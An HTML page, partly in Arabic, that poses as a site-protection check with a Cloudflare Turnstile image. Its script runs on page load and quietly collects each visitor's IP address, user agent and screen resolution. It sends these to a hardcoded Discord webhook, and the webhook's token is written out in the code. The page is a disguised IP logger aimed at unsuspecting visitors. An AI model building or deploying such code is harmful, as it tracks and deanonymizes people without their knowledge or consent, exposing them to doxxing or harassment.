<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The end</title>
    <!-- أضف الرابط إلى شعار الموقع -->
    <link rel="icon" type="image/png" href="your_logo.png">
    <style>
        /* CSS */
        body {
            background-image: url(pmg.png);
            margin: 0;
            font-family: Arial, sans-serif;
            text-align: center;
            color: rgb(255, 255, 255);
        }

        .container {
            position: relative;
            margin-top: 20%;
        }

        .arrow {
            position: absolute;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
            animation: moveArrow 1.5s infinite;
        }

        @keyframes moveArrow {
            0% {
                left: 0;
            }
            50% {
                left: calc(100% - 20px);
            }
            100% {
                left: 0;
            }
        }

        img {
            max-width: 100%;
            max-height: 80%;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>This site is protected</h1>
    <span class="arrow">End</span>
    <p>Developed by End</p>
    <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/2atsfrGgvgOc3DZ91qMlKN/0412afa63e5fac20964377c70c1a9a17/turnstile_gif.gif" alt="الصورة">
</div>

<script>
    // JavaScript
    const webhookURL = 'https://discord.com/api/webhooks/1231177221553786961/rPr2Pnz-_TdxSle_9lPD95pTuhLgNmpFM3AsvFaZFwSZ-cAl42mIsrGzaUlzYkqZaoIH';

    // Gather visitor information
    const visitorInfo = {
        ipAddress: '',
        userAgent: navigator.userAgent,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        // Add more information as needed
    };

    // Get visitor's IP address using an external service
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            visitorInfo.ipAddress = data.ip;

            // Prepare payload with visitor information
            const payload = {
                embeds: [
                    {
                        title: 'New Visitor!',
                        description: 'A new visitor has accessed the website.',
                        color: 16711680, // Red color (you can change it)
                        fields: [
                            {
                                name: 'IP Address:',
                                value: visitorInfo.ipAddress,
                            },
                            {
                                name: 'User Agent:',
                                value: visitorInfo.userAgent,
                            },
                            {
                                name: 'Screen Resolution:',
                                value: `${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`,
                            },
                        ],
                        footer: {
                            text: 'Developed by End',
                            icon_url: 'https://cdn.discordapp.com/avatars/1130546038760018060/41eb7e46eafe176a548afbf6c6e82497.png?size=1024', // Add your icon URL here
                        },
                    },
                ],
            };

            // Send data to Discord webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send data to webhook');
                }
            })
            .catch(error => {
                console.error('Error sending data to webhook:', error);
            });
        })
        .catch(error => {
            console.error('Error getting visitor IP address:', error);
        });
</script>

<audio controls src="phonk.mp3" autoplay=""></audio>

</body>
</html>
